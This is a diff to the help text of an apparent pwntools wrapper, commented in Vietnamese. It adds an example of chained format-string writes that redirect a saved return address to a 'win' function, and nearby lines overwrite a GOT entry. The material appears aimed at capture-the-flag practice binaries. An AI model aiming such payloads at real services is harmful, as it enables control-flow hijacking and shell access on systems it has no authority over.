@@ -815,6 +815,12 @@ _HELP = r"""@pwnld — lớp helper mỏng bọc pwntools. Trong exploit:  from 
   #   phát 1 FULL (chạy trước) dựng con trỏ ô 10 -> saved-rip; phát 2 SHORT ghi xuyên ô 14:
   payload = flat(fmtstr_pos(10, 0xa8, size=1, form="full"),            # written=0, consumed=0
                  fmtstr_pos(14, exe.sym.get_shell + 5, written=0xa8))  # in sau 0xa8 ký tự
+  # consumed: chuỗi 3 tầng — HAI phát FULL liên tiếp; phát full sau đếm %c TIẾP từ consumed:
+  payload = flat(fmtstr_pos(10, 0xb0, size=1, form="full"),               # consumed=0 -> arg10
+                 fmtstr_pos(12, 0xc8, size=1, form="full",                # consumed=10 -> đếm
+                            consumed=10, written=0xb0),                   #   tiếp arg11 -> arg12
+                 fmtstr_pos(14, exe.sym.win, written=0xc8))              # short: ghi xuyên ô 14
+  #   (quên consumed=10 -> phát 2 đếm lại từ arg1, ăn nhầm 11 arg padding -> lệch hết)
   # fmtstr_payload (khi BIẾT địa chỉ đích): off = ô bắt đầu payload (dò %p):
   payload = fmtstr_payload(6, {exe.got.puts: exe.sym.win})
   # numbwritten: prompt in sẵn vài ký tự trước payload -> trừ vào pad:
